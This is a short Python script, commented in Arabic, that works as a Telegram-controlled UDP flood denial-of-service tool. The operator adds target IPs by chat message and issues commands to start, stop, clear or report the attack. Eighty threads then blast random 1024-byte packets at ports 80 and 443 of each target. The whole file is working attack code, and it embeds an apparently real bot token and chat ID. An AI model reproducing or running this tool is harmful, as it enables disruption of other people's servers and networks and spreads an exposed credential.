import socket, random, threading, time, requests

TOKEN = "8603678400:AAHHOLE8XWV7XVWNE_nyuTG4NP1_FjBSvXA"
ID = "8343706519"
TARGETS = [] # تبدأ القائمة فارغة وأنت تملؤها
STATUS = "STOPPED"
sent_packets = 0

def telegram(msg):
    try: requests.post(f"https://api.telegram.org/bot{TOKEN}/sendMessage", data={'chat_id': ID, 'text': msg}, timeout=10)
    except: pass

def cloud_sniper():
    global sent_packets
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    while True:
        if STATUS == "RUNNING" and TARGETS:
            try:
                for ip in TARGETS:
                    payload = random._urandom(1024)
                    sock.sendto(payload, (ip, 80))
                    sock.sendto(payload, (ip, 443))
                    sent_packets += 2
                time.sleep(0.01)
            except: pass
        else: time.sleep(1)

def cloud_controller():
    global STATUS, sent_packets, TARGETS
    last_id = 0
    telegram("🛰️ MONITOR CLOUD: ONLINE\n🎮 نظام التحكم اليدوي مفعل\n\nأرسل الآيبي الجديد مباشرة لإضافته.")
    while True:
        try:
            url = f"https://api.telegram.org/bot{TOKEN}/getUpdates?offset={last_id+1}&timeout=30"
            res = requests.get(url).json()
            for up in res.get("result", []):
                last_id = up["update_id"]
                msg = up.get("message", {}).get("text", "").strip()
                
                if msg == "اشتغل":
                    if not TARGETS:
                        telegram("⚠️ لم تضع أي آيبي بعد! أرسل الآيبي أولاً.")
                    else:
                        STATUS = "RUNNING"
                        telegram(f"🔥 بدأ الخنق على: {', '.join(TARGETS)}")
                elif msg == "توقف":
                    STATUS = "STOPPED"
                    telegram(f"🛑 تم التوقف. الإجمالي: {sent_packets}")
                elif msg == "تصفير":
                    TARGETS = []
                    telegram("🗑️ تم مسح جميع الأهداف.")
                elif msg == "الوضع":
                    s = "نشط 🔥" if STATUS == "RUNNING" else "متوقف 🛑"
                    telegram(f"📊 الحالة: {s}\n🚀 الضرب: {sent_packets}\n🎯 الأهداف: {TARGETS}")
                elif "." in msg: # إذا أرسلت نصاً يحتوي على نقطة (مثل الآيبي)
                    TARGETS.append(msg)
                    telegram(f"✅ تم إضافة الهدف الجديد: {msg}")
        except: time.sleep(5)

if __name__ == "__main__":
    for _ in range(80):
        threading.Thread(target=cloud_sniper, daemon=True).start()
    cloud_controller()
